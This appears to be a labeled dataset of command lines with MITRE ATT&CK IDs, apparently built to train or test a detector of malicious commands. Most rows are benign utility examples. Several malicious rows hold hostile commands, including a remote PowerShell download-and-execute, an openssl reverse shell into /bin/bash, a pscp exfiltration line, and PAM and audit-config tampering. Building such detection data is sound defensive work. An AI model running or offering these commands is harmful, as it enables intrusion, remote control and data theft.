command,label,original_label,mitre_id
sudo btrfs [su|subvolume] [sh|show] path/to/subvolume,Benign,Benign,Benign
sysbench --file-test-mode=rndrd|rndrw|rndwr|seqrd|seqrewr|seqwr fileio run,Benign,Benign,Benign
sc_wartsfilter -i path/to/input.warts -o path/to/output.warts -a 192.0.2.5 -a 192.0.2.6,Benign,Benign,Benign
pwn shellcraft amd64.linux.sh,Benign,Benign,Benign
killall 'Google Chrome',Malicious,Malicious,T1539
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'),Context_Dependent,Malicious,T1082
apport-cli -f,Malicious,Malicious,T1548
fusermount [-u|--update] path/to/mount_point,Benign,Benign,Benign
shopt -s histverify,Benign,Benign,Benign
fping [-q|--quiet] [-a|--alive] [-g|--generate] 192.168.1.1 192.168.1.254,Benign,Benign,Benign
yarn --cwd .,Malicious,Malicious,T1059
qrcp send --zip path/to/file_or_directory,Benign,Benign,Benign
"khal new -a personal 2020-09-08 18:00 18:30 ""Dentist appointment""",Benign,Benign,Benign
llm install package1 package2 ...,Benign,Benign,Benign
find / -iname findcommandexamples.txt,Context_Dependent,Benign,Benign
"zeroclaw agent [-m|--message] ""Hello"" [-t|--temperature] 0.5",Benign,Benign,Benign
"sudo sed -i ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",Malicious,Malicious,T1556
"find . -type f -printf '%p %s\n' | perl -n -a -e '$sum+=$S[1]; print ""$sum\n""'",Benign,Benign,Benign
c99 -o executable_name file.c,Benign,Benign,Benign
mandb --test,Benign,Benign,Benign
bmon [-R|--rate-interval] 2.0,Benign,Benign,Benign
pnmgamma -lineartobt709|srgbtobt709 path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
airpaste < path/to/file,Benign,Benign,Benign
find /path/to/directory -type d \! -name . -prune -exec printf x \; | wc -c,Benign,Benign,Benign
"[Reflection.Assembly]::LoadFile(\""%s\"")\n$i=\""\""\n$r=[%s]::%s(\""%s\"",[ref] $i)\necho $r,$i\n",Malicious,Malicious,T1059
sudo lvdisplay,Benign,Benign,Benign
uv self update [-v|--verbose],Benign,Benign,Benign
omz changelog,Benign,Benign,Benign
ruff check --fix,Benign,Benign,Benign
aws acm-pca list-certificate-authorities,Benign,Benign,Benign
find / -name '*.xml' 2>/dev/null | head -20,Context_Dependent,Synthetic,Synthetic
sshare,Benign,Benign,Benign
hyperfine [-w|--warmup] 5 'make',Benign,Benign,Benign
msbuild path/to/project_file /target:targets,Benign,Benign,Benign
"find . -name *.xml | xargs grep -P ""[\x80-\xFF]""",Benign,Benign,Benign
ldc2 -c path/to/source.d,Benign,Benign,Benign
pulumi env rm environment_name,Benign,Benign,Benign
find . -size +1000M,Benign,Benign,Benign
pw-dump [-r|--remote] remote_name > path/to/dump_file.json,Benign,Benign,Benign
nim check path/to/file.nim,Benign,Benign,Benign
vagrant plugin update vagrant_vbguest,Benign,Benign,Benign
arithmetic -o +|-|x|/,Benign,Benign,Benign
find . -type f ! -perm 777,Benign,Benign,Benign
check-support-status --no-heading,Benign,Benign,Benign
env -u FOO somecommand,Benign,Benign,Benign
sudo dmidecode [-s|--string] bios-version,Benign,Benign,Benign
find /tmp -name '*.swp' -exec rm {} \;,Benign,Benign,Benign
pydocstyle --count file.py|path/to/directory,Benign,Benign,Benign
"echo -e ""Testing\r_Tested"" | awk -v RS=""_"" '{ print $0; }' | od -a",Benign,Benign,Benign
fc-list,Benign,Benign,Benign
find $HOME -iname '*.ogg',Benign,Benign,Benign
raw /dev/raw/raw1 /dev/block_device,Benign,Benign,Benign
echo Password!>> passwords.txt,Malicious,Malicious,T1110
gdu --no-progress path/to/directory,Benign,Benign,Benign
lbu [inc|include] path/to/file_or_directory,Benign,Benign,Benign
size [-o|--radix=8] path/to/file,Benign,Benign,Benign
cat index.html | pup 'div text{}',Benign,Benign,Benign
"find . -type f -mtime +356 -printf '%s\n' | awk '{a+=$1;} END {printf ""%.1f GB\n"", a/2**30;}'",Benign,Benign,Benign
chisel client server_ip:server_port local_host:local_port:remote_server:remote_port,Benign,Benign,Benign
"find ./work -print | xargs grep ""profit""",Benign,Benign,Benign
tldr npm owner,Benign,Benign,Benign
$(dirname $0),Benign,Benign,Benign
winget upgrade [-r|--all],Benign,Benign,Benign
pactl move-sink-input 627 1,Benign,Benign,Benign
updpkgsums [-v|--version],Benign,Benign,Benign
glxgears -h,Benign,Benign,Benign
"if ($app -eq $null) { Write-Warning ""Application not found""; exit }",Malicious,Malicious,T1098
"echo ""<line>"" | cut -d "";"" -f 2",Benign,Benign,Benign
Set-Location ..,Benign,Benign,Benign
snmpget [-h|--help],Benign,Benign,Benign
tcptraceroute host destination_port packet_length,Benign,Benign,Benign
resolvconf --disable-updates,Benign,Benign,Benign
ignite generate plugin_name path/to/file,Benign,Benign,Benign
srun hostname,Benign,Benign,Benign
"find ! -path ""dir1"" ! -path ""dir2"" -iname ""*.mp3""",Benign,Benign,Benign
pct config 100,Benign,Benign,Benign
dot path/to/input.gv | mingle | dot -T png > path/to/output.png,Benign,Benign,Benign
alias mkcd='_(){ mkdir -pv $1; cd $1; }; _',Benign,Benign,Benign
zipsplit -p -n size path/to/archive.zip,Benign,Benign,Benign
compress -v path/to/file,Benign,Benign,Benign
mkinitfs -C gzip|xz|zstd|lz4|none,Benign,Benign,Benign
msgcat [-t|--to-code] UTF-8 input.po [-o|--output-file] output.po,Benign,Benign,Benign
"lighthouse --only-categories=performance,accessibility,best-practices,seo,pwa https://example.com",Benign,Benign,Benign
agg [-h|--help],Benign,Benign,Benign
kill -9 `pgrep -f cps_build`,Benign,Benign,Benign
pacini path/to/file --verbose,Benign,Benign,Benign
chkconfig --list ntpd,Benign,Benign,Benign
virsh list --all --with-snapshot|without-snapshot,Benign,Benign,Benign
wifi-password,Benign,Benign,Benign
jrnl,Benign,Benign,Benign
smbclient.py -inputfile path/to/input_file domain/username:password@target,Benign,Benign,Benign
head path/to/file1 path/to/file2 ...,Benign,Benign,Benign
phpstorm diff path/to/left_file path/to/right_file,Benign,Benign,Benign
gcov [-a|--all-blocks] path/to/file.cpp,Benign,Benign,Benign
loft start,Benign,Benign,Benign
pkgctl db update,Benign,Benign,Benign
acme.sh --issue [-d|--domain] example.com [-w|--webroot] /path/to/webroot,Benign,Benign,Benign
sudo trace-cmd record -g function,Benign,Benign,Benign
firefox --safe-mode,Benign,Benign,Benign
CONFIG -writelang path/to/file.lang,Benign,Benign,Benign
sf force:source:push --targetusername organization,Benign,Benign,Benign
picotool load path/to/binary,Benign,Benign,Benign
lpstat -E,Benign,Benign,Benign
tuxi -h,Benign,Benign,Benign
evil.bin,Malicious,Malicious,T1036
isoinfo -d -i path/to/image.iso,Benign,Benign,Benign
"find olddir -name script.sh -printf ""%p\0"" -printf ""newdir/%P\0"" | xargs -0L2 cp -n",Benign,Benign,Benign
ln -nsf alpha_2 alpha,Benign,Benign,Benign
query session,Benign,Benign,Benign
laravel new name --dev,Benign,Benign,Benign
echo y | $pscp_binary -P $scp_port -pw $scp_password $exfil_package $scp_user@$target_location:$target_filename,Malicious,Malicious,T1105
cal month year,Benign,Benign,Benign
"find . |sed 's,\(.*\)/\(.*\)$,\1/\2\t\1/\L\2,'|sort|uniq -D -f 1|cut -f 1",Benign,Benign,Benign
terraform show path/to/file.tfplan,Benign,Benign,Benign
find /etc/apache-perl -newer /etc/apache-perl/httpd.conf,Benign,Benign,Benign
ifconfig eth0:fakenfs 192.0.2.55 netmask 255.255.255.255,Context_Dependent,Benign,Benign
top -p 18884 -p 18892 -p 18919,Benign,Benign,Benign
duperemove -r -d --hashfile=path/to/hashfile --io-threads=n --cpu-threads=n path/to/directory,Benign,Benign,Benign
multitail -Q 1 'pattern',Benign,Benign,Benign
apg -r path/to/dictionary_file,Benign,Benign,Benign
cb copy path/to/file,Benign,Benign,Benign
thunar --bulk-rename,Benign,Benign,Benign
slim,Benign,Benign,Benign
net.exe group /domain,Context_Dependent,Malicious,T1069
"find / -name ""*.dbf"" -exec dirname {} \; 2> /dev/null | sort -u",Context_Dependent,Benign,Benign
k9s --context kubeconfig_context_name,Benign,Benign,Benign
evil-winrm [-i|--ip] ip_address [-u|--user] user [-p|--password] password,Benign,Benign,Benign
az vm restart [-g|--resource-group] rg [-n|--name] vm_name,Benign,Benign,Benign
pdftocairo path/to/file.pdf output.pdf -pdf -expand,Benign,Benign,Benign
mhwd-gpu --check,Benign,Benign,Benign
mycli [-u|--user] username database_name,Benign,Benign,Benign
omf list,Benign,Benign,Benign
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,Context_Dependent,Malicious,T1217
unzip -c path/to/archive1.zip path/to/archive2.zip ...,Benign,Benign,Benign
snoop -V -i path/to/file,Benign,Benign,Benign
"git ls-files | grep -vE ""(png|jpg|ico)"" | xargs wc -l",Benign,Benign,Benign
p5 server,Benign,Benign,Benign
datashader_cli points path/to/input_data.geo.parquet path/to/output_data.png --geo true --matplotlib true,Benign,Benign,Benign
tlmgr pinning show,Benign,Benign,Benign
gvpack -n path/to/layout1.gv path/to/layout2.gv ... > path/to/output.gv,Benign,Benign,Benign
find . -maxdepth 2 -type f,Benign,Benign,Benign
appman [-s|sync],Benign,Benign,Benign
p7zip [-f|--force] path/to/file,Benign,Benign,Benign
dbclient user@host -p 2222,Benign,Benign,Benign
raco pkg install --auto package_source,Benign,Benign,Benign
koji untag-build tag NVR1 NVR2 ... [-n|--test],Benign,Benign,Benign
pio pkg publish --private,Benign,Benign,Benign
atoum --init,Benign,Benign,Benign
sudo btrfs [c|check] --repair --init-csum-tree path/to/partition,Benign,Benign,Benign
bear --force-preload -- make,Benign,Benign,Benign
"ansiweather -u metric -f 7 -l Rzeszow,PL",Benign,Benign,Benign
tv,Benign,Benign,Benign
7za a path/to/archive.7z -mx=0|1|3|5|7|9 path/to/file_or_directory,Benign,Benign,Benign
git secret reveal,Benign,Benign,Benign
apptainer capability list,Benign,Benign,Benign
pw-jack -r remote_instance_name command,Benign,Benign,Benign
net user art-test $password,Malicious,Malicious,T1078
tldr apx stacks,Benign,Benign,Benign
pamcomp [-ali|-align] left|center|right|beyondleft|beyondright [-x|-xoff] x_offset path/to/overlay.pam path/to/underlay.pam > path/to/output.pam,Benign,Benign,Benign
apt-clone clone --destination path/to/backup.tar.gz,Benign,Benign,Benign
security-checker security:check path/to/composer.lock,Benign,Benign,Benign
unflatten path/to/input1.gv path/to/input2.gv ... > path/to/output.gv,Benign,Benign,Benign
"textutil -cat html -title ""Several Files"" -output path/to/index.html *.rtf",Benign,Benign,Benign
requestbin.net,Malicious,Malicious,T1071
laydown doing item,Benign,Benign,Benign
opencode debug agent agent_name,Benign,Benign,Benign
bindkey,Benign,Benign,Benign
git count-objects [-H|--human-readable],Benign,Benign,Benign
pacrepairdb package_name,Benign,Benign,Benign
ldd path/to/binary,Benign,Benign,Benign
reflac --preserve path/to/directory,Benign,Benign,Benign
"banner [-w|--width] 50 ""Hello World""",Benign,Benign,Benign
lprm -h server:port job_id,Benign,Benign,Benign
cheat [-l|--list],Benign,Benign,Benign
coreutils util util_options,Benign,Benign,Benign
kerl list releases,Benign,Benign,Benign
"for l in $(find . -type l); do cd $(dirname $l); if [ ! -e ""$(readlink $(basename $l))"" ]; then echo $l; fi; cd - > /dev/null; done",Benign,Benign,Benign
piactl login path/to/login_file,Benign,Benign,Benign
"find . -type d | sed -e 's/^\.\///g' | awk '{print $1, $1}' | xargs chgrp",Benign,Benign,Benign
mv svnlog.py svnlog,Benign,Benign,Benign
flashrom [-p|--programmer] programmer,Benign,Benign,Benign
"CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}",Malicious,Malicious,T1546
apptainer registry logout docker://registry,Benign,Benign,Benign
"find /mydir -type f -name ""*.txt"" -execdir chown root {} ';'",Benign,Benign,Benign
dnf versionlock,Benign,Benign,Benign
nest [i|info],Benign,Benign,Benign
keyctl timeout key_name timeout_in_seconds,Benign,Benign,Benign
airodump-ng wlan0,Context_Dependent,Synthetic,Synthetic
compopt,Benign,Benign,Benign
gdb -batch -p 1 -ex 'info proc mappings',Context_Dependent,Synthetic,Synthetic
"mount | tail -1 | sed -e ""s/^[^/]*\(.*\) type .*$/\1/g""",Context_Dependent,Benign,Benign
"echo ""*** Delivery channel deleted ***""",Malicious,Malicious,T1562
. path/to/file,Benign,Benign,Benign
cupsd -t -c path/to/cupsd.conf,Benign,Benign,Benign
opt -dot-cfg -S path/to/file.bc -disable-output,Benign,Benign,Benign
watchman watch-del-all,Benign,Benign,Benign
exa [-r|--reverse] [-s|--sort] size,Benign,Benign,Benign
bdfr download path/to/output_directory [-u|--user] me --saved --authenticate --file-scheme '{{ {POSTID}_{TITLE}_{UPVOTES} }}' --no-dupes --search-existing,Benign,Benign,Benign
tput sgr0,Benign,Benign,Benign
find path/to/directory -type d -iname '*lib*',Benign,Benign,Benign
i2cset i2cbus device_address register_address value,Benign,Benign,Benign
chown amzadm.root -R /usr/lib/python2.6/site-packages/,Benign,Benign,Benign
qwen --show-memory-usage,Benign,Benign,Benign
[System.Reflection.Assembly]::Load,Malicious,Malicious,T1620
gpgconf --list-components,Benign,Benign,Benign
git sed -c 'find_text' 'replace_text',Benign,Benign,Benign
localectl list-x11-keymap-layouts,Benign,Benign,Benign
find . -type f -not -name '.*' -mtime +500 -exec ls {} \;,Benign,Benign,Benign
nxc smb|ssh|ldap|ftp|wmi|winrm|rdp|vnc|mssql [-M|--module] module_name --options,Benign,Benign,Benign
systemctl hibernate --no-wall,Benign,Benign,Benign
"var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){",Malicious,Malicious,T1059
Set-Location Cert:\LocalMachine\My,Malicious,Malicious,T1552
mount \\computer_name\share_name *,Context_Dependent,Benign,Benign
smbget smb://server/share/file,Benign,Benign,Benign
"dig +noall +answer soa yahoo.com | awk '{sub(/.$/,"""",$5);print $5}'",Benign,Benign,Benign
hg commit [-i|--interactive],Benign,Benign,Benign
find / -perm +4000,Context_Dependent,Benign,Benign
radeontop,Benign,Benign,Benign
pkgin full-upgrade,Benign,Benign,Benign
ipcmk [-M|--shmem] segment_size_in_bytes octal_permissions,Benign,Benign,Benign
typeorm query sql_sentence,Benign,Benign,Benign
"echo ""$at_command"" | at $time_spec",Malicious,Malicious,T1053
konsole --background-mode,Benign,Benign,Benign
valgrind --tool=massif --stacks=yes program,Benign,Benign,Benign
chgrp -R my_group files,Benign,Benign,Benign
boltctl forget device_uuid,Benign,Benign,Benign
rspec path/to/directory,Benign,Benign,Benign
awk '{print $5}' path/to/file,Benign,Benign,Benign
ifconfig eth0 down,Context_Dependent,Benign,Benign
csvformat [-U|--out-quoting] 0 data.csv,Benign,Benign,Benign
darling shell path/to/program program_argument_1 program_argument_2 ...,Benign,Benign,Benign
service service_name --full-restart,Benign,Benign,Benign
brew --prefix,Benign,Benign,Benign
"elasticsearch-croneval ""cron_expression"" [-c|--count] integer",Benign,Benign,Benign
sdkmanager --uninstall package,Benign,Benign,Benign
"find . -name ""*.jpg"" -exec ls {} \;",Benign,Benign,Benign
apptainer sign [-i|--sif-id] object_id path/to/image.sif,Benign,Benign,Benign
k8s-unused-secret-detector,Benign,Benign,Benign
pihole status,Benign,Benign,Benign
haproxy -f path/to/haproxy.cfg -sf pid,Benign,Benign,Benign
"echo ""deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu precise main"" | tee -a /etc/apt/sources.list",Benign,Benign,Benign
tig --all,Benign,Benign,Benign
flatpak run --command=sh com.example.app,Benign,Benign,Benign
pdfinfo -opw password path/to/file.pdf,Benign,Benign,Benign
dmypy check -- path/to/file.py,Benign,Benign,Benign
cargo [c|check] --test integration_test1,Benign,Benign,Benign
manim --list_scenes path/to/file.py,Benign,Benign,Benign
cp -nr src_dir dest_dir,Benign,Benign,Benign
gc path/to/file.dot,Benign,Benign,Benign
sacctmgr add cluster cluster_name,Benign,Benign,Benign
watch -n 60 killall -USR1 dd,Benign,Benign,Benign
ssh -L 3306:localhost:3306 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
idea inspect path/to/project_directory path/to/inspection_profile path/to/output,Benign,Benign,Benign
driverquery /s hostname /u username /p password,Benign,Benign,Benign
findmnt -t ext4,Context_Dependent,Synthetic,Synthetic
nh os switch path/to/flake,Benign,Benign,Benign
yadm init -f path/to/local_repository,Benign,Benign,Benign
openssl s_client -quiet -connect 10.0.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
neo4j-admin database load --from-path=path/to/directory database_name --overwrite-destination=true,Benign,Benign,Benign
rkdeveloptool wlx partition_name path/to/image.img,Benign,Benign,Benign
user: x,Malicious,Malicious,T1059
reg add key_name /v value,Benign,Benign,Benign
print,Benign,Benign,Benign
hsd-cli rpc command args,Benign,Benign,Benign
takeout disable,Benign,Benign,Benign
powercfg /energy /output path\to\report.html,Benign,Benign,Benign
sudo eopkg install package,Benign,Benign,Benign
"xargs rm -f <<< $(find . -name "".txt"")",Benign,Benign,Benign
"Add-MailboxPermission -Identity ""$delegate_target"" -User ""$operator_mailbox"" -AccessRights FullAccess -InheritanceType All",Malicious,Malicious,T1098
kubectl auth can-i verb resource [-n|--namespace] namespace,Context_Dependent,Benign,Benign
split -l $MAX_LINES_PER_CHUNK $ORIGINAL_FILE $CHUNK_FILE_PREFIX,Benign,Benign,Benign
dvc fetch,Benign,Benign,Benign
sudo repquota [-augs|--all --user --group --human-readable],Benign,Benign,Benign
chfn [-h|--home-phone] new_home_telephone_number username,Benign,Benign,Benign
set `od -j $o -N 8 -t u1 $pkg`,Benign,Benign,Benign
pg_waldump start_segment end_segment [-r|--rmgr] rmgr_name,Benign,Benign,Benign
pygbag path/to/project_folder --port 8080,Benign,Benign,Benign
InvocationMethod = '$invocation_method',Malicious,Malicious,T1218
ng [n|new] app_name [-g|--skip-git],Benign,Benign,Benign
sed -i '$ a #art_test_1562_006_1' /etc/audisp/$audisp_config_file_name,Malicious,Malicious,T1562
HKCU\Software\dnimtsoleht\StubPath,Malicious,Malicious,T1547
abrt-action-analyze-backtrace -d path/to/directory,Benign,Benign,Benign
simplehttpserver -rules rules.yaml,Benign,Benign,Benign
